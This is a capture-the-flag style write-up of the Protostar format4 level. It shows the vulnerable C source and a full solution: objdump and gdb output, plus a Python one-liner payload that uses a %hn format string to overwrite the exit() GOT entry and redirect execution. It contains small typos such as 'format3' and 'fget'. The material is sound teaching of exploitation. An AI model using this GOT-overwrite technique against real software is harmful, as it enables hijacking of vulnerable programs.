#### Protostar Format4 

##### About
%p format4 looks at one method of redirecting execution in a process.

###### Hints
* objdump -TR is your friend

This level is at /opt/protostar/bin/format4

##### Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);   
}

int main(int argc, char **argv)
{
  vuln();
}
```

Try to change the entry address of function exit() in GOT.

##### Solution
```
$ objdump -t format4 | grep hello
080484b4 g     F .test  0000001e              hello

$ objdump -TR format4 | grep exit
00000000      DF *UND* 00000000  GLIBC_2.0   _exit
00000000      DF *UND*  00000000  GLIBC_2.0   exit
08049718 R_386_JUMP_SLOT   _exit
08049724 R_386_JUMP_SLOT   exit

$ echo 'AAAA' > /tmp/payload

$ gdb format3
......
(gdb) disas vuln
Dump of assembler code for function vuln:
0x080484d2 <+0>:    push   %ebp
0x080484d3 <+1>:    mov    %esp,%ebp
0x080484d5 <+3>:    sub    $0x218,%esp
0x080484db <+9>:    mov    0x8049730,%eax
0x080484e0 <+14>:   mov    %eax,0x8(%esp)
0x080484e4 <+18>:   movl   $0x200,0x4(%esp)
0x080484ec <+26>:   lea    -0x208(%ebp),%eax
0x080484f2 <+32>:   mov    %eax,(%esp)
0x080484f5 <+35>:   call   0x804839c <fget@plt>
0x080484fa <+40>:   lea    -0x208(%ebp),%eax
0x08048500 <+46>:   mov    %eax,(%esp)
0x08048503 <+49>:   call   0x80483cc <printf@plt>
0x08048508 <+54>:   movl   $0x1,(%esp)
0x0804850f <+61>:   call   0x80483ec <exit@plt>
End of assembler dump
(gdb) b *0x08048503
Breakpoint 1 at 0x08048503: file format4/format4.c, line 20.
(gdb) r < /tmp/payload
Starting program: /opt/protostar/bin/format4 < /tmp/payload
Breakpoint 1, 0x08048503 in vuln() at format4/format4.c:20
(gdb) x/4x $esp
0xbffffb00:     0xbffffb10      0x00000200      0xb7fd8420      0xbffffb54
(gdb) x 0xbffffb10
0xbffffb10:     0x41414141
(gdb) p (0xbffffb10 - 0xbffffb00) / 4
$1 = 4
(gdb) x/x 0x08049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:   0x080483f2
(gdb) quit

$ python -c 'print "\x24\x97\x04\x08"+"%33968x%4$hn"' | ./format4      <-- '%hn' can write only two byte
......
code execution redirected! you win
```

##### Reference
<https://thesprawl.org/research/exploit-exercises-protostar-format/#format-4>  
<http://louisrli.github.io/blog/2012/08/29/protostar-format0/>
